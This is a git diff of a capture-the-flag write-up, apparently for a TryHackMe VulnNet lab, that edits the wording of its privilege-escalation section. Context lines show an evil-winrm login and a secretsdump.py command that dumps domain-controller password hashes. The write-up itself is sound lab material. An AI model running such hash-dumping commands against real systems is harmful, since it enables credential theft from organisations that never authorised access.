@@ -177,11 +177,11 @@ evil-winrm -i vulnet.thm -u a-whitehat -p <redacted>
 
 ## Privilege Escalation
 
-Checked groups and realised user a-whitehat belong to the domain admins group, this will enable us dump hashes from SAM database using secretsdump.py from impacket
+Enumerating user groups, i realised user a-whitehat belongs to the domain admins group, this will enable us dump hashes from SAM database using secretsdump.py from impacket
 
-![image](https://user-images.githubusercontent.com/68066436/118693532-21ee8c80-b7d9-11eb-9b2d-195be8421d32.png)
+![image](https://user-images.githubusercontent.com/68066436/118728937-fda7a580-b802-11eb-8ce6-cd5e555bc129.png)
 
-Let's dump the hashes with secretsdump
+Let's dump the hashes
 ```python
 python3 secretsdump.py -just-dc a-whitehat:<redacted password>@vulnnet-rst.local
 ```
